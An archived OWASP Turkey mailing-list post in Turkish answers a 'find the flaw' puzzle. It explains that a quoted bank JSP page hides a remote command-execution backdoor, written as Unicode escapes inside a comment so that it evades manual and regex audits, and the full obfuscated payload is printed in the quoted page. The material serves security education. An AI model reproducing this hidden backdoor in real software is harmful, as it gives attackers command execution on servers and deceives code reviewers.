<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-turkey] Ar&#305;zay&#305; Bul #4
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-turkey%40lists.owasp.org?Subject=%5BOwasp-turkey%5D%20%3D%3Futf-8%3Fb%3FQXLEsXphecSxIEJ1bCAjNA%3D%3D%3F%3D&In-Reply-To=297cff690910181105o5964912at3707e8f361bf2564%40mail.gmail.com">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="000727.html">
   <LINK REL="Next"  HREF="000729.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-turkey] Ar&#305;zay&#305; Bul #4</H1>
    <B>Bedirhan Urgun</B> 
    <A HREF="mailto:owasp-turkey%40lists.owasp.org?Subject=%5BOwasp-turkey%5D%20%3D%3Futf-8%3Fb%3FQXLEsXphecSxIEJ1bCAjNA%3D%3D%3F%3D&In-Reply-To=297cff690910181105o5964912at3707e8f361bf2564%40mail.gmail.com"
       TITLE="[Owasp-turkey] Ar&#305;zay&#305; Bul #4">bedirhanurgun at gmail.com
       </A><BR>
    <I>Tue Oct 20 11:38:07 EDT 2009</I>
    <P><UL>
        <LI>Previous message: <A HREF="000727.html">[Owasp-turkey] Ar&#305;zay&#305; Bul #4
</A></li>
        <LI>Next message: <A HREF="000729.html">[Owasp-turkey] Owasp-turkey Digest, Vol 31, Issue 22
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#728">[ date ]</a>
              <a href="thread.html#728">[ thread ]</a>
              <a href="subject.html#728">[ subject ]</a>
              <a href="author.html#728">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>digerlerine daha gore daha ilgi ceker dedim ama...  :)) cekmedi

cevap &quot;herkes developer'lara guveniyor ama uretimin canina okuyabilirler&quot;
mantigi ile yazilmis bir backdoor. Java belirli bir formatta (\uxxxx)
unicode karakterler ile kod yazilmasina imkan taniyor. Yani butun
identifier, keyword, operator v.b.'lerin ascii olmasina gerek yok. (C# icin
ise boyle bir kisitlama var yani keyword ve operator'ler icin mesela sadece
ascii karakterler kullanilabiliyor.). Kisacasi verdigim JSP icerisindeki
unicode formatinda yazilan bolumu, basina ve sonuna ' karakteri koyduktan
sonra

<A HREF="http://www.webguvenligi.org/ipacker/ipacker.html">http://www.webguvenligi.org/ipacker/ipacker.html</A>

uygulamasinin INPUT bolumune koyup EVAL TO OUTPUT butonuna basarsaniz,
aslinda developer'in nasil bir backdoor yazdigini gorebilirsiniz. Ortaya
cikan parca, multiline comment bolumunu kapatip, asil backdoor kodunu yazip,
daha sonra tekrar multiline comment bolumunu aciyor (ki &quot;syntax error&quot;
almayalim, ayni sqli, ldapi gibi).

Bu sekilde ciplak gozle bakan veya regex ile audit yapmaya calisan bir
denetimcinin isi zorlasiyor.

bedirhan

18 Ekim 2009 21:05 tarihinde Bedirhan Urgun &lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-turkey">bedirhanurgun at gmail.com</A>&gt; yazd&#196;&#177;:

&gt;<i>
</I>&gt;<i> Bu kez eglenceli bir ariza var :) Ise farkli bir perspektiften bakmayi
</I>&gt;<i> gerektiriyor. Bir JSP sayfasi...
</I>&gt;<i>
</I>&gt;<i> bedirhan
</I>&gt;<i>
</I>&gt;<i> Arizayi Bul #4
</I>&gt;<i> --------------------
</I>&gt;<i>
</I>&gt;<i> &lt;%@page &lt;%<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-turkey">25 at page</A>&gt; contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
</I>&gt;<i> &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;
</I>&gt;<i>    &quot;<A HREF="http://www.w3.org/TR/html4/loose.dtd&quot;">http://www.w3.org/TR/html4/loose.dtd&quot;</A>&gt;
</I>&gt;<i> &lt;html&gt;
</I>&gt;<i>     &lt;head&gt;
</I>&gt;<i>         &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
</I>&gt;<i>         &lt;title&gt;BankHorizon Welcome Page&lt;/title&gt;
</I>&gt;<i>         &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot; /&gt;
</I>&gt;<i>     &lt;/head&gt;
</I>&gt;<i>     &lt;body&gt;
</I>&gt;<i>         &lt;% /* Include the header page */ %&gt;
</I>&gt;<i>         &lt;jsp:include page=&quot;header.jsp&quot; /&gt;
</I>&gt;<i>         &lt;% /* Include the menu page */ %&gt;
</I>&gt;<i>         &lt;jsp:include page=&quot;menu.jsp&quot; /&gt;
</I>&gt;<i>         &lt;% /* Include the footer menu left page */ %&gt;
</I>&gt;<i>         &lt;jsp:include page=&quot;footer_menu_left.jsp&quot; /&gt;
</I>&gt;<i>         &lt;h2&gt;&lt;/h2&gt;
</I>&gt;<i>         &lt;jsp:include page=&quot;data_validation.jsp&quot; /&gt;
</I>&gt;<i>         &lt;%
</I>&gt;<i>             /************************************COMMENT
</I>&gt;<i> BEGIN**************************************
</I>&gt;<i>            This is unicode that will be used for data validation
</I>&gt;<i>
</I>&gt;<i> \u002a\u002f\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0073\u003d\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0061\u0072\u006b\u0061\u006b\u0061\u0070\u0069\u0022\u0029\u003b\u0020\u0069\u0066\u0020\u0028\u0020\u0073\u0021\u003d\u006e\u0075\u006c\u006c\u0020\u0026\u0026\u0020\u0073\u002e\u0065\u0071\u0075\u0061\u006c\u0073\u0028\u0020\u0022\u0061\u0063\u0069\u006b\u0022\u0020\u0029\u0020\u0029\u0020\u007b\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0020\u0022\u006b\u006f\u006d\u0075\u0074\u0022\u0020\u0029\u0020\u0029\u003b\u0020\u007d\u002f\u002a
</I>&gt;<i>             *************************************COMMENT
</I>&gt;<i> END***********************************/
</I>&gt;<i>             String lang = request.getParameter(&quot;language&quot;);
</I>&gt;<i>             // use the unicode above to validate the data
</I>&gt;<i>             validateUnicode(lang);
</I>&gt;<i>         %&gt;
</I>&gt;<i>         &lt;br/&gt;
</I>&gt;<i>         &lt;% /* Include the footer bottom page */ %&gt;
</I>&gt;<i>         &lt;jsp:include page=&quot;footer_bottom.jsp&quot; /&gt;
</I>&gt;<i>     &lt;/body&gt;
</I>&gt;<i> &lt;/html&gt;
</I>&gt;<i>
</I>


-- 
Bedirhan Urgun
<A HREF="http://www.webguvenligi.org">http://www.webguvenligi.org</A>
<A HREF="http://www.owasp.org/index.php/Turkey">http://www.owasp.org/index.php/Turkey</A>

T&#195;&#188;rk&#195;&#167;e Web Uygulama G&#195;&#188;venli&#196;&#159;i E-Posta Listesine &#195;&#188;ye olmak i&#195;&#167;in:
<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-turkey">https://lists.owasp.org/mailman/listinfo/owasp-turkey</A>
-------------- sonraki b&#246;l&#252;m --------------
Bir HTML eklentisi temizlendi...
URL: <A HREF="https://lists.owasp.org/pipermail/owasp-turkey/attachments/20091020/a678bcf7/attachment.html">https://lists.owasp.org/pipermail/owasp-turkey/attachments/20091020/a678bcf7/attachment.html</A> 
</PRE>


<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="000727.html">[Owasp-turkey] Ar&#305;zay&#305; Bul #4
</A></li>
	<LI>Next message: <A HREF="000729.html">[Owasp-turkey] Owasp-turkey Digest, Vol 31, Issue 22
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#728">[ date ]</a>
              <a href="thread.html#728">[ thread ]</a>
              <a href="subject.html#728">[ subject ]</a>
              <a href="author.html#728">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-turkey">More information about the Owasp-turkey
mailing list</a><br>
</body></html>
